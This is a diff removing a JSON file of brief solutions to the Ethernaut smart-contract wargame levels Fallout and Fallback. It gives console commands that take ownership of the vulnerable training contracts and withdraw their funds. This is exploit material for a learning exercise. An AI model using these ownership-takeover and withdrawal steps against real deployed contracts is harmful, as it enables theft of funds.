@@ -1,9 +1,0 @@
-{
-    "avatar": "https://avatars.githubusercontent.com/u/6122675?v=4",
-    "Fallout.md": [
-        "The constructor has incorrect syntax and is misspelled, you can call it as a function and change the ownership of the contract:\n\n``` contract.Fal1out() ```"
-    ],
-    "fallback.md": [
-        "Smart Contract Audit Ethernaut: Fallback\n\nIn this game the player must become the owner, then withdraw the full amount from the contract.\n\nThe key part is the receive() function, if the contract recieves a value greater than 0 and contributions of the sender are also greater than zero, then the sender becomes the owner.\n\nWe send some small sum to the player:\n\n``` await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')}) ```\n\nWe send a small sum to the contract:\n\n``` await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')}) ```\n\nCheck we own the contract:\n\n``` await contract.owner() ```\n\nThen withdraw the loot:\n\n``` await contract.withdraw() ```"
-    ]
-}
